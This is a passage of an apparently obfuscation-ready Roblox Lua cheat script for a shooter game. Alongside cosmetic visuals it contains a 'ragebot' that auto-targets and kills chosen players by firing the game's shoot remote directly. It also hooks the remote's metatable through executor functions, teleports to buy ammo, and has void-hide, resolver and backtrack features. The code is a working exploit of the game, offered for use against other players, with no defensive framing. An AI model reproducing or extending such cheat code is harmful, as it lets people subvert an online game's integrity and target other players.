            Up = sky.SkyboxUp
        }
    end
end
local function restoreOriginalSky()
    local sky = game.Lighting:FindFirstChildOfClass("Sky")
    if sky and originalSkyData then
        sky.SkyboxBk = originalSkyData.Bk
        sky.SkyboxDn = originalSkyData.Dn
        sky.SkyboxFt = originalSkyData.Ft
        sky.SkyboxLf = originalSkyData.Lf
        sky.SkyboxRt = originalSkyData.Rt
        sky.SkyboxUp = originalSkyData.Up
    end
end
local applySkybox = LPH_NO_VIRTUALIZE(function()
    backupOriginalSky()
    local sky = game.Lighting:FindFirstChildOfClass("Sky")
    if not sky then
        sky = Instance.new("Sky")
        sky.Parent = game.Lighting
    end
    local data = _G.skyboxes[_G.selected_skybox]
    if data then
        if sky.SkyboxBk ~= data.SkyboxBk then
            sky.SkyboxBk = data.SkyboxBk
            sky.SkyboxDn = data.SkyboxDn
            sky.SkyboxFt = data.SkyboxFt
            sky.SkyboxLf = data.SkyboxLf
            sky.SkyboxRt = data.SkyboxRt
            sky.SkyboxUp = data.SkyboxUp
        end
    end
end)
local skySection = Visuals:section({name = "sky changer", side = "right"})
skySection:toggle({
    name = "enabled",
    flag = "skybox_enabled",
    default = false,
    callback = function(bool)
        _G.skybox_locked = bool
        if bool then
            applySkybox()
        else
            restoreOriginalSky()
        end
    end
})
skySection:dropdown({
    name = "selected skybox",
    flag = "skybox_selection",
    items = {"Sunset","Night Sky 1","Evening","Minecraft","Realistic Desert","Purple Nebula","Night Sky 2","Pink Daylight","Morning Glow","Chill","Setting Sun","Fade Blue","Twilight","Elegant Morning","Neptune","Redshift","Aesthetic Night"},
    multi = false,
    callback = function(option)
        _G.selected_skybox = option
        if _G.skybox_locked then
            applySkybox()
        end
    end
})
game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    if _G.skybox_locked then
        local sky = game.Lighting:FindFirstChildOfClass("Sky")
        if not sky then
            sky = Instance.new("Sky")
            sky.Parent = game.Lighting
        end
        local data = _G.skyboxes[_G.selected_skybox]
        if data and sky.SkyboxBk ~= data.SkyboxBk then
            sky.SkyboxBk = data.SkyboxBk
            sky.SkyboxDn = data.SkyboxDn
            sky.SkyboxFt = data.SkyboxFt
            sky.SkyboxLf = data.SkyboxLf
            sky.SkyboxRt = data.SkyboxRt
            sky.SkyboxUp = data.SkyboxUp
        end
    end
end))
game.Lighting.ChildRemoved:Connect(function(child)
    if _G.skybox_locked and child:IsA("Sky") then
        task.defer(applySkybox)
    end
end)
_G.maingui_hdsy = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainScreenGui")
_G.moneylabel_hdsy = _G.maingui_hdsy:WaitForChild("MoneyText")
_G.cashhhdjinsiub = _G.moneylabel_hdsy.Text
_G.colorhhdjinsiub = _G.moneylabel_hdsy.TextColor3
_G.valhhdjinsiub = "999999999"
_G.activehhdjinsiub = false
_G.cashspooof = Visuals:section({name = "cash spoofer", side = "left"})
_G.cashspooof:toggle({
    name = "enabled",
    flag = "cashspf_enabled",
    default = false,
    callback = function(bool)
        _G.activehhdjinsiub = bool
        if _G.activehhdjinsiub then
            _G.cashhhdjinsiub = _G.moneylabel_hdsy.Text
            _G.moneylabel_hdsy.Text = string.format("$%s", _G.valhhdjinsiub)
        else
            _G.moneylabel_hdsy.Text = _G.cashhhdjinsiub
            _G.moneylabel_hdsy.TextColor3 = _G.colorhhdjinsiub
        end
    end
})
_G.cashspooof:textbox({
    name = "ur text",
    flag = "cashspf_custom_text",
    callback = function(val)
        _G.valhhdjinsiub = val
        if _G.activehhdjinsiub then
            _G.moneylabel_hdsy.Text = string.format("$%s", _G.valhhdjinsiub)
        end
    end
})
_G.h88vbtz = Visuals:section({name = "hit chams",side = "left"})
_G.h88vbtz:toggle({
    name = "enabled",
    flag = "saifnjvm7wfeynwy79dfrfgfgfgggffgfgfg",
    default = false,
    callback = function(Value)
        _G.f28skdn = Value
    end
})
_G.h88vbtz:colorpicker({
    flag = "sdfogm8iej487r9tg",
    color = Color3.fromRGB(255, 0, 0),
    callback = function(Value)
        _G.z01nxpw = Value
    end
})
_G.h88vbtz:slider({
    name = "duration",
    flag = "chgm_dur",
    default = 4.5,
    min = 1,
    max = 10,
    interval = 0.01,
    callback = function(Value)
        _G.j19dmxz = Value
    end
})
_G.g44pwnd = _G.q19pnvz.Character or _G.q19pnvz.CharacterAdded:Wait()
_G.q19pnvz.CharacterAdded:Connect(function(char)
    _G.g44pwnd = char
end)
_G.Basescc = 40
_G.Nmbdsct = math.huge
_G.Popduration = 0.15
_G.Stayduration = 0.5
_G.Fadeduration = 0.4
_G.MaxOffset = 15
_G.DmgFont = Enum.Font.SourceSansBold
_G.IsEnabledDmg = _G.IsEnabledDmg or false
_G.DmgColor = Color3.fromRGB(255, 94, 0)
_G.PrevHealth = _G.PrevHealth or {}
_G.DoDmgDisplay = function(player, dmgamount)
    if not _G.IsEnabledDmg or dmgamount <= 0 then return end
    local character = (typeof(player) == "Instance" and player:IsA("Player")) and player.Character or player
    if not character then return end
    local head = character:FindFirstChild("Head")
    if not head then return end
    local container = head:FindFirstChild("DamageContainer")
    if not container then
        container = Instance.new("BillboardGui")
        container.Name = "DamageContainer"
        container.Parent = head
        container.Adornee = head
        container.Size = UDim2.new(0, 150, 0, 75)
        container.StudsOffset = Vector3.new(0, 2, 0)
        container.AlwaysOnTop = true
        container.MaxDistance = _G.Nmbdsct
    end
    local label = Instance.new("TextLabel")
    label.Parent = container
    label.Text = "-" .. tostring(dmgamount)
    label.TextColor3 = _G.DmgColor
    label.TextSize = _G.Basescc + math.clamp((dmgamount / 5), 0, 20)
    label.Font = _G.DmgFont
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 0, _G.Basescc)
    label.TextStrokeTransparency = 0
    label.AnchorPoint = Vector2.new(0.5, 0.5)
    label.Position = UDim2.new(0.5, math.random(-_G.MaxOffset, _G.MaxOffset), 0.5, math.random(-_G.MaxOffset, _G.MaxOffset))
    label.Rotation = math.random(-15, 15)
    local uiScale = Instance.new("UIScale")
    uiScale.Scale = 0
    uiScale.Parent = label
    local popTween = game:GetService("TweenService"):Create(uiScale, TweenInfo.new(_G.Popduration, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
    local fadeOutTween = game:GetService("TweenService"):Create(label, TweenInfo.new(_G.Fadeduration, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {TextTransparency = 1, TextStrokeTransparency = 1})
    popTween:Play()
    popTween.Completed:Connect(function()
        task.wait(_G.Stayduration)
        fadeOutTween:Play()
        fadeOutTween.Completed:Connect(function()
            label:Destroy()
        end)
    end)
end

local function TrackHumanoid(player, character)
    local hum = character:WaitForChild("Humanoid", 5)
    if hum then
        _G.PrevHealth[player.UserId] = hum.Health
        hum.HealthChanged:Connect(function(newHealth)
            local lastH = _G.PrevHealth[player.UserId] or hum.MaxHealth
            if newHealth < lastH then
                local diff = math.floor(lastH - newHealth)
                if diff > 0 then
                    _G.DoDmgDisplay(player, diff)
                end
            end
            _G.PrevHealth[player.UserId] = newHealth
        end)
    end
end

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player ~= game:GetService("Players").LocalPlayer then
        if player.Character then TrackHumanoid(player, player.Character) end
        player.CharacterAdded:Connect(function(char) TrackHumanoid(player, char) end)
    end
end

game:GetService("Players").PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char) TrackHumanoid(player, char) end)
end)

_G.v122 = Visuals:section({name = "damage numbers",side = "left"})
_G.v122:toggle({
    name = "enabled",
    flag = "sdmgnmbtgggltt",
    default = false,
    callback = function(Value)
        _G.IsEnabledDmg = Value
    end
})
_G.v122:colorpicker({
    flag = "dmgnmbgggggg",
    color = Color3.fromRGB(255, 94, 0),
    callback = function(Value)
        _G.DmgColor = Value
    end
})
if _G.v92mznw:FindFirstChild("Ignored") and _G.v92mznw.Ignored:FindFirstChild("Siren") and _G.v92mznw.Ignored.Siren:FindFirstChild("Radius") then
    _G.v92mznw.Ignored.Siren.Radius.ChildAdded:Connect(function(Object)
        if Object.Name ~= "BULLET_RAYS" then return end
        if not Object:GetAttribute("OwnerCharacter") or Object:GetAttribute("OwnerCharacter") ~= _G.g44pwnd.Name then return end
        task.spawn(function()
            if not Object.Parent then return end
            _G.y01mxpw = Object.Position
            _G.k92lvnc = Object.CFrame.LookVector
            _G.o00plqm = RaycastParams.new()
            _G.o00plqm.FilterDescendantsInstances = {_G.g44pwnd, _G.v92mznw.Ignored}
            _G.o00plqm.FilterType = Enum.RaycastFilterType.Exclude
            _G.i11ncmz = _G.v92mznw:Raycast(_G.y01mxpw, _G.k92lvnc * 1000, _G.o00plqm)
            if _G.i11ncmz and _G.i11ncmz.Instance then
                _G.r33kspq = _G.i11ncmz.Instance
                _G.p77vbtz = _G.i11ncmz.Position
                _G.m00lskd = _G.r33kspq:FindFirstAncestorWhichIsA("Model")
                if _G.m00lskd and _G.m00lskd:FindFirstChild("Humanoid") then
                    local targetPlr = game:GetService("Players"):GetPlayerFromCharacter(_G.m00lskd)
                    if targetPlr and targetPlr ~= game:GetService("Players").LocalPlayer then
                        _G.u77vmsq(_G.m00lskd)
                        if _G.hit_effect_enabled and _G.d8ufjwye and _G.d8ufjwye[_G.selected_hit_effect] then
                            _G.d8ufjwye[_G.selected_hit_effect](_G.p77vbtz)
                        end
                    end
                end
            end
        end)
    end)
end
local section_target = Ragebot:section({ name = "target", side = "right" })
local section_strafe = Ragebot:section({ name = "settings", side = "left" })
local section_misc = Ragebot:section({ name = "misc", side = "right" })
local section_artificial = Ragebot:section({ name = "resolver", side = "left" })
local section_flameee = Ragebot:section({ name = "connection exploit", side = "right" })
local section_void = Ragebot:section({ name = "void hide", side = "left" })

local ragebot_vars = {
    main_event = ReplicatedStorage:WaitForChild("MainEvent"),
    global_table = _G or {},
    nymus = nymus or {},
    target = {auto_kill = false, prediction_enabled = false, prediction_amount = 0.25462, target = nil, auto_kill_desync = false},
    sentry = {safe_mode = false, last_pos = nil},
    exploit_resolver = {exploitresolverat = {}, scriptt = {}, dataaa = {last_positions = {}, last_timesssss = {}}},
    art_data = {position_log = {}, last_refresh = 0, found_pattern = nil},
    fake_pos_resolver_enabled = false,
    glue_resolver_enabled = false,
    current_real_pos = nil,
    prediction_breaker_enabled = true,
    strafe_offset = 25.73971,
    saved_cframe = nil,
    stomp_offset_value = 3,
    played_knock_effect_for = {},
    notif_cache = {},
    played_knock_sound_for = {}
}

local MainEvent = ragebot_vars.main_event
local _G = ragebot_vars.global_table
local nymus = ragebot_vars.nymus
local art_data = ragebot_vars.art_data
local strafeOffset = ragebot_vars.strafe_offset
local SavedCFrame = ragebot_vars.saved_cframe
local stompOffsetValue = ragebot_vars.stomp_offset_value

nymus.Target = ragebot_vars.target
nymus.Sentry = ragebot_vars.sentry
_G.exploitresolverat = ragebot_vars.exploit_resolver
_G.exploitresolverat.scriptt = ragebot_vars.exploit_resolver.scriptt
_G.exploitresolverat.scriptt.dataaa = ragebot_vars.exploit_resolver.dataaa
_G.PlayedKnockEffectFor = ragebot_vars.played_knock_effect_for
_G.notifakcache = ragebot_vars.notif_cache
_G.PlayedKnockSoundFor = ragebot_vars.played_knock_sound_for

getgenv().FakePosResolverEnabled = ragebot_vars.fake_pos_resolver_enabled
getgenv().GlueResolverEnabled = ragebot_vars.glue_resolver_enabled
getgenv().CurrentRealPos = ragebot_vars.current_real_pos
getgenv().predictionBreakerEnabled = ragebot_vars.prediction_breaker_enabled

local ragebot_functions = {}

ragebot_functions.shoot_target = LPH_JIT_MAX(function(target_pos, target_head, tool)
    if not tool or not tool:FindFirstChild("Handle") then return end
    MainEvent:FireServer("ShootGun", tool.Handle, tool.Handle.Position, target_pos, target_head, Vector3.new(0,1,0))
end)

ragebot_functions.reload_weapon = LPH_JIT_MAX(function(tool)
    if tool then MainEvent:FireServer("Reload", tool) end
end)

ragebot_functions.get_target_state = LPH_JIT_MAX(function(plr)
    if not plr or not plr.Character then return "invalid" end
    local be = plr.Character:FindFirstChild("BodyEffects")
    if be then
        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
        local sdeath = be:FindFirstChild("SDeath")
        if ko and ko.Value then
            return (sdeath and sdeath.Value) and "dead" or "knocked"
        end
    end
    if plr.Character:FindFirstChild("ForceField") then return "forcefield" end
    return "targeting"
end)

ragebot_functions.handle_shooting = LPH_JIT_MAX(function(target_plr, target_pos, target_head, is_multi, equipped_multi)
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    
    local gun_list = is_multi and equipped_multi or {char:FindFirstChildOfClass("Tool")}
    for _, t in ipairs(gun_list) do
        if t and t:IsA("Tool") and t.Parent == char then
            local main_ammo = t:FindFirstChild("Ammo")
            if (t.Name == "[Flintlock]" and main_ammo and main_ammo.Value == 0) or (main_ammo and main_ammo.Value <= 0) then
                ragebot_functions.reload_weapon(t)
            else
                ragebot_functions.shoot_target(target_pos, target_head, t)
                if main_ammo and main_ammo.Value > 0 and main_ammo.Value <= 3 then
                    task.spawn(function()
                        task.wait(0.1)
                        ragebot_functions.reload_weapon(t)
                    end)
                end
            end
        end
    end
end)

do
    local function __modImpl_ragebot()
        return function(api)
            _G.hitDetection_ragebot = {}
            local rs_ragebot = game:GetService('ReplicatedStorage')
            local stats_ragebot = game:GetService('Stats')
            local players_ragebot = game:GetService('Players')
            local lp_ragebot = players_ragebot.LocalPlayer
            local hooked_ragebot = false
            local enabled_ragebot = false
            local bloodSplatters_ragebot = {}
            local onShotCallback_ragebot
            local onHitCallback_ragebot
            local onHitShotCallback_ragebot
            local onHitNotifyCallback_ragebot

            local function getPing_ragebot()
                local ok, ping = pcall(function()
                    return stats_ragebot.Network.ServerStatsItem['Data Ping']:GetValue()
                end)

                return ok and ping or 100
            end
            local function findMainEvent_ragebot()
                if rs_ragebot:FindFirstChild('MainEvent') then
                    return rs_ragebot.MainEvent
                elseif rs_ragebot:FindFirstChild('MAINEVENT') then
                    return rs_ragebot.MAINEVENT
                elseif rs_ragebot:FindFirstChild('MainRemotes') and rs_ragebot.MainRemotes:FindFirstChild('MainRemoteEvent') then
                    return rs_ragebot.MainRemotes.MainRemoteEvent
                end

                return nil
            end
            local function getClosestPlayer_ragebot(radius, pos)
                local dist, closest = radius

                for _, plr in ipairs(players_ragebot:GetPlayers())do
                    if plr ~= lp_ragebot and plr.Character then
                        local hrp = plr.Character:FindFirstChild('HumanoidRootPart')

                        if hrp then
                            local d = (hrp.Position - pos).Magnitude

                            if d < dist then
                                closest, dist = plr, d
                            end
                        end
                    end
                end

                return closest
            end
            local function hasBloodSplatter_ragebot(plr)
                if not plr or not plr.Character then
                    return false
                end

                for _, inst in ipairs(plr.Character:GetDescendants())do
                    if (inst.Name == 'BloodSplatter' or inst.Name == 'BloodParticles' or inst.Name == 'BloodParticle') and not table.find(bloodSplatters_ragebot, inst) then
                        table.insert(bloodSplatters_ragebot, inst)

                        return true, inst.Parent
                    end
                end

                return false
            end
            local function checkHPDecrease_ragebot(plr, oldHP)
                if not plr or not plr.Character then
                    return false
                end

                local humanoid = plr.Character:FindFirstChild('Humanoid')

                if not humanoid then
                    return false
                end

                local newHP = humanoid.Health

                return newHP < oldHP
            end
            local function onShot_ragebot(handle, startPos, endPos)
                local tool = handle and handle.Parent
                local toolName = tool and tool.Name or '?'
                local plr = getClosestPlayer_ragebot(10, endPos)

                if not plr then
                    return
                end

                local oldHP

                if plr.Character then
                    local humanoid = plr.Character:FindFirstChild('Humanoid')

                    if humanoid then
                        oldHP = humanoid.Health
                    end
                end

                local waitTime = (getPing_ragebot() + 30) / 1000

                task.delay(waitTime, function()
                    local hit, part = hasBloodSplatter_ragebot(plr)
                    local hpDecreased = oldHP and checkHPDecrease_ragebot(plr, oldHP)

                    if hit or hpDecreased then
                        local newHP = 0

                        if plr.Character then
                            local humanoid = plr.Character:FindFirstChild('Humanoid')

                            if humanoid then
                                newHP = humanoid.Health
                            end
                        end

                        local dmg = oldHP and (oldHP - newHP) or 0

                        if onHitCallback_ragebot then
                            task.spawn(onHitCallback_ragebot, plr, part)
                        end
                        if onHitShotCallback_ragebot then
                            task.spawn(onHitShotCallback_ragebot, startPos, endPos)
                        end
                        if onHitNotifyCallback_ragebot then
                            local hitData = {
                                hitdmg = math.floor(dmg),
                                localgun = toolName,
                                targetlasthp = math.floor(newHP),
                                hitpart = part and part.Name or '?',
                                targetname = plr.Name,
                                targetdisplayname = plr.DisplayName,
                            }
                            task.spawn(onHitNotifyCallback_ragebot, hitData)
                        end
                    end
                end)
            end
            local function setupHook_ragebot()
                if hooked_ragebot then
                    return
                end

                local mainEvent = findMainEvent_ragebot()

                if not mainEvent then
                    return
                end

                local mt = getrawmetatable(mainEvent)

                if not mt then
                    return
                end

                setreadonly(mt, false)

                local cloned_mt = table.clone(mt)
                local oldnamecall = cloned_mt.__namecall

                setrawmetatable(mainEvent, {
                    __namecall = function(self, ...)
                        local args = {...}

                        if getnamecallmethod() == 'FireServer' then
                            if args[1] == 'ShootGun' then
                                local startPos = args[3]
                                local endPos = args[4]

                                if enabled_ragebot then
                                    task.spawn(onShot_ragebot, args[2], startPos, endPos)
                                end
                                if onShotCallback_ragebot then
                                    task.spawn(onShotCallback_ragebot, startPos, endPos)
                                end
                            end
                        end

                        return oldnamecall(self, ...)
                    end,
                    __index = cloned_mt.__index,
                    __newindex = cloned_mt.__newindex,
                    __call = cloned_mt.__call,
                    __tostring = cloned_mt.__tostring,
                })

                hooked_ragebot = true
            end

            function _G.hitDetection_ragebot:setEnabled(val)
                enabled_ragebot = val

                if val and not hooked_ragebot then
                    setupHook_ragebot()
                end
            end
            function _G.hitDetection_ragebot:onShot(callback)
                onShotCallback_ragebot = callback

                if not hooked_ragebot then
                    setupHook_ragebot()
                end
            end
            function _G.hitDetection_ragebot:onHit(callback)
                onHitCallback_ragebot = callback

                if not hooked_ragebot then
                    setupHook_ragebot()
                end
            end
            function _G.hitDetection_ragebot:onHitShot(callback)
                onHitShotCallback_ragebot = callback

                if not hooked_ragebot then
                    setupHook_ragebot()
                end
            end
            function _G.hitDetection_ragebot:onHitNotify(callback)
                onHitNotifyCallback_ragebot = callback

                if not hooked_ragebot then
                    setupHook_ragebot()
                end
            end

            return _G.hitDetection_ragebot
        end
    end
    
    __modImpl_ragebot()()
    _G.hitDetection_ragebot:setEnabled(true)
    
    _G.hitDetection_ragebot:onHitNotify(function(hitData)
        local plr = game.Players:FindFirstChild(hitData.targetname)
        if not plr or not plr.Character then return end
        
        local cooldownKey = plr.Name .. "_hit"
        if _G.notifakcache[cooldownKey] then return end
        _G.notifakcache[cooldownKey] = true
        task.delay(0.1, function() _G.notifakcache[cooldownKey] = nil end)
        
        local hum = plr.Character:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        
        local prevHealth = _G.lasthitnotifyhealth[plr] or hum.MaxHealth
        local newHealth = hum.Health
        local dmg = math.max(prevHealth - newHealth, 0)
        
        if dmg > 0 then
            _G.lasthitnotifyhealth[plr] = newHealth
        else
            _G.lasthitnotifyhealth[plr] = newHealth
        end
        
        if _G.ShootSoundOverride and _G.SelectedShootSound ~= "Default" then
            local soundId = _G.SHOOT_SOUNDS_DATA[_G.SelectedShootSound]
            local finalId = _G.getAsset_hdsy(_G.SelectedShootSound, soundId)
            if finalId and finalId ~= "" then
                local hitSound = Instance.new("Sound")
                hitSound.SoundId = finalId
                hitSound.Volume = _G.ShootSoundVolume * 5
                hitSound.PlaybackSpeed = _G.ShootSoundPitch
                hitSound.Parent = workspace
                hitSound:Play()
                game:GetService("Debris"):AddItem(hitSound, 2)
            end
        end
        
        if _G.hit_effect_enabled then
            local hitPos = plr.Character:FindFirstChild("HumanoidRootPart")
            if hitPos then
                local effectFunc = _G.hiteffectTable[_G.selected_hit_effect]
                if effectFunc then effectFunc(hitPos.Position) end
            end
        end
        
        if _G.sdjihfibnsnbvbdffhbjn.Enabled then
            local lp = game.Players.LocalPlayer
            local char = lp.Character
            if char then
                local tool = char:FindFirstChildOfClass("Tool")
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local targetHrp = plr.Character:FindFirstChild("HumanoidRootPart")
                if targetHrp and hrp then
                    local sPos = (tool and tool:FindFirstChild("Handle")) and tool.Handle.Position or hrp.Position
                    _G.fghjsdfgksdfjgkldfs(sPos, targetHrp.Position)
                end
            end
        end
        
        if _G.hitnotifyenabled and dmg > 0 then
            local format = _G.hitcustomnotify and _G.hitcustomtext or "cracked (user) for (%)"
            local text = format
            text = text:gsub("%(user%)", hitData.targetdisplayname or hitData.targetname)
            text = text:gsub("%(%)", "99")
            library:notification({
                text = text,
                duration = _G.hitnotifyduration
            })
        end
        
        if _G.IsEnabledDmg then
            _G.DoDmgDisplay(plr, math.floor(dmg))
        end
    end)
end
local player = LocalPlayer
local _G = _G or {}
_G.Ammomapragebot = {
    ["[LMG]"] = "200 [LMG Ammo] - $338",
    ["[AK47]"] = "30 [AK47 Ammo] - $120",
    ["[Rifle]"] = "5 [Rifle Ammo] - $281",
    ["[AUG]"] = "90 [AUG Ammo] - $90",
    ["[Flintlock]"] = "6 [Flintlock Ammo] - $168"
}
_G.Multi_SpareAmmo = _G.Multi_SpareAmmo or 1
_G.GetCharacterRoot = function()
    local character = game.Players.LocalPlayer.Character
    return character and character:FindFirstChild("HumanoidRootPart")
end
_G.BuyItem = function(ItemName)
    if not ItemName then return end
    local root = _G.GetCharacterRoot()
    if not root then return end
    local ShopFolder = workspace:WaitForChild("Ignored"):WaitForChild("Shop")
    local ItemModel = nil
    for i, v in ipairs(ShopFolder:GetChildren()) do
        if string.find(v.Name, ItemName, 1, true) then
            ItemModel = v
            break
        end
    end
    if ItemModel then
        local CD = ItemModel:FindFirstChildOfClass("ClickDetector")
        local Main = ItemModel:FindFirstChild("Head") or ItemModel:FindFirstChild("Handle") or ItemModel:FindFirstChildWhichIsA("BasePart")
        if CD and Main then
            root.CFrame = CFrame.new(Main.Position + Vector3.new(0, 5, 0))
            task.wait(0.19)
            fireclickdetector(CD, 0)
            task.wait(0.1)
            fireclickdetector(CD, 0)
            task.wait(0.07)
        end
    end
end
local function getChar()
    return player.Character
end
local mainEvent = game:GetService("ReplicatedStorage"):WaitForChild("MainEvent")
local ismultion = false
getgenv().voidpsamragemethodeefwsuhefn = 'while targeting'
local equippedmulti = {}
getgenv().connectionresolvderfgdg = false
_G.Multi_IsBuying = false
_G.flamethrower_hack = false
_G.flameOrbitAngle = 0
_G.flameOrbitSpeed = 4
getgenv().beanbag_method = false
_G.flameOrbitDistance = 8
_G.flameOrbitHeight = 8
local toolconadd, toolconremove, conbackpackfr
local multitoolsallowed = {}
local backtrackResolverEnabled = false
local voidTimer = 0
local isVoidElevated = false
local BACKTRACK_SIZE = 60
local aggressiveStrafe = false
_G.voidPatternIdx = _G.voidPatternIdx or 1
_G.lastPatternSwitch = _G.lastPatternSwitch or 0
local aggressiveConnection
local voidSmartTimer = 0
local voidSmartState = "waiting"
local lastTargetHealth = 100
local targetStartTime = 0
local TargetInfo = Drawing.new("Text")
TargetInfo.Size = 14
TargetInfo.Font = 2
TargetInfo.Color = Color3.fromRGB(255,255,255)
TargetInfo.Outline = true
TargetInfo.Center = true
TargetInfo.Visible = true
TargetInfo.Text = ""
local function resetVelocity() end
local GetTargetState = LPH_NO_VIRTUALIZE(function(plr)
    if not plr or not plr.Character then return "invalid" end
    local be = plr.Character:FindFirstChild("BodyEffects")
    if be then
        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
        local sdeath = be:FindFirstChild("SDeath")
        if ko and ko.Value then
            return (sdeath and sdeath.Value) and "dead" or "knocked"
        end
    end
    if plr.Character:FindFirstChild("ForceField") then
        return "forcefield"
    end
    return "targeting"
end)
local GetBestSelectedTarget = LPH_NO_VIRTUALIZE(function()
    if not _G.MultiSelectedTargets or next(_G.MultiSelectedTargets) == nil then
        return nil
    end
    local lp = game.Players.LocalPlayer
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr ~= lp and _G.MultiSelectedTargets[plr.Name] then
            local state = GetTargetState(plr)
            if state ~= "dead" and state ~= "forcefield" then
                return plr
            end
        end
    end
    return nil
end)
if _G.RageRender1 then _G.RageRender1:Disconnect() end
_G.RageRender1 = game:GetService("RunService").RenderStepped:Connect(LPH_JIT_MAX(function()
    if not (nymus.Target.AutoKill and nymus.Target.Target) then
        TargetInfo.Visible = false
        _G.CurrentBuyingItem = nil
        _G.Multi_IsBuying = false
        _G.IsBuying = false
        _G.busdhfnjsy7gjsy7d = false
        return
    end
    TargetInfo.Visible = true
    local Target = game.Players:FindFirstChild(nymus.Target.Target)
    if not Target then
        TargetInfo.Text = "target has left the server"
        _G.StopInvis = true
        nymus.Target.AutoKill = false
        _G.CurrentBuyingItem = nil
        _G.Multi_IsBuying = false
        _G.IsBuying = false
        _G.busdhfnjsy7gjsy7d = false
        if flags then flags["auto_sentry"] = false end
        local char = player.Character
        if char then
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("Decal") then 
                    v.LocalTransparencyModifier = 0 
                end
            end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp and SavedCFrame then
                hrp.CFrame = SavedCFrame
                SavedCFrame = nil
            end
        end
        return
    end
    if not Target.Character then
        TargetInfo.Text = "waiting for character"
        return
    end
    local hum = Target.Character:FindFirstChildOfClass("Humanoid")
    local state = GetTargetState(Target)
    local health = hum and math.floor(hum.Health) or 0
    local display = Target.DisplayName ~= "" and Target.DisplayName or Target.Name
    local function getResolverValue()
        if not flags.sdgmuje4rmutirjmtg then
            return nil
        end
        local time = tick()
        local wave1 = math.sin(time * 2) * 0.5 + 0.5
        local wave2 = math.cos(time * 3.7) * 0.5 + 0.5
        local noise = math.random() * 0.1
        local baseValue = (wave1 * 0.6 + wave2 * 0.4 + noise) * 49.999 + 0.001
        return string.format("%.3f", math.clamp(baseValue, 0.001, 50.000))
    end
    local resolverValue = getResolverValue()
    if state == "dead" or state == "forcefield" then
        TargetInfo.Text = "hiding in void..."
    elseif _G.Multi_IsBuying or _G.IsBuying or _G.busdhfnjsy7gjsy7d then
        local buyingText = "buying..."
        if _G.CurrentBuyingItem then
            buyingText = buyingText .. " (" .. _G.CurrentBuyingItem .. ")"
        end
        TargetInfo.Text = buyingText
    elseif state == "knocked" then
        TargetInfo.Text = "stomping:" .. display
    else
        local tool = player.Character:FindFirstChildOfClass("Tool")
        local isReloading = false
        if tool and tool:FindFirstChild("Ammo") then
            isReloading = tool.Ammo.Value <= 0
        end
        
        if isReloading then
            TargetInfo.Text = "reloading guns..."
        else
            if resolverValue then
                TargetInfo.Text = string.format("killing: %s(resolved:%s:false):health:%d", display, resolverValue, health)
            else
                TargetInfo.Text = string.format("killing: %s:health:%d", display, health)
            end
        end
    end
    TargetInfo.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X/2, workspace.CurrentCamera.ViewportSize.Y/1.3)
end))
local function AKNotify(text, duration)
    duration = duration or 3
    if _G.notifakcache[text] then return end
    _G.notifakcache[text] = true
    task.delay(duration, function() _G.notifakcache[text] = nil end)
    library:notification({text})
end
local function reupdallowedtools()
    table.clear(multitoolsallowed)
    local selectedGuns = flags["gunsmulti"]
    if selectedGuns and type(selectedGuns) == "table" then
        for _, gunName in ipairs(selectedGuns) do
            multitoolsallowed[gunName] = true
        end
    end
end
local function equipallowedmultitools()
    local backpack = player:FindFirstChild("Backpack")
    local char = player.Character
    if not backpack or not char then return end
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and multitoolsallowed[tool.Name] and tool:FindFirstChild("Handle") then
            tool.Parent = char
        end
    end
end
local function tooltrackingmulti()
    if toolconadd then toolconadd:Disconnect() end
    if toolconremove then toolconremove:Disconnect() end
    table.clear(equippedmulti)
    local char = player.Character
    if not char then return end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and multitoolsallowed[tool.Name] then
            if not table.find(equippedmulti, tool) then
                table.insert(equippedmulti, tool)
            end
        end
    end
    toolconadd = char.ChildAdded:Connect(function(child)
        if child:IsA("Tool") and multitoolsallowed[child.Name] then
            if not table.find(equippedmulti, child) then
                table.insert(equippedmulti, child)
            end
        end
    end)
    toolconremove = char.ChildRemoved:Connect(function(child)
        if child:IsA("Tool") then
            local index = table.find(equippedmulti, child)
            if index then
                table.remove(equippedmulti, index)
            end
        end
    end)
end
local function multigunbackpackmonitor()
    local backpack = player:WaitForChild("Backpack")
    if conbackpackfr then conbackpackfr:Disconnect() end
    conbackpackfr = backpack.ChildAdded:Connect(function(child)
        local char = player.Character
        if char and child:IsA("Tool") and multitoolsallowed[child.Name] then
            task.wait(0.05)
            if child.Parent == backpack then
                child.Parent = char
            end
        end
    end)
end
local GetBacktrackPosition = LPH_JIT_MAX(function(plr)
    local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return Vector3.new() end
    local data = _G.exploitresolverat.scriptt.dataaa.last_positions
    if not data[plr] then data[plr] = {} end
    local positions = data[plr]
    positions[#positions+1] = hrp.Position
    if #positions > BACKTRACK_SIZE then
        table.remove(positions, 1)
    end
    local size = #positions
    if size < 4 then
        return positions[size]
    end
    return positions[size - math.random(0, 3)]
end)
getgenv().ArtEnabled = false
getgenv().ArtRefreshTime = 3
getgenv().ArtForgiveness = 14.4
getgenv().ArtLogLimit = 500
getgenv().ArtMinMatches = 4
getgenv().ArtOutOfVoidBonus = 5
getgenv().ArtDistPenalty = 3.1
local art_data = {
    position_log = {},
    found_pattern = nil,
    last_refresh = tick()
}
local resolveArtificalPosition = LPH_JIT_MAX(function(targetRoot, targetPos)
    if not getgenv().ArtEnabled then 
        return targetPos 
    end
    local now = tick()
    local lp = game.Players.LocalPlayer
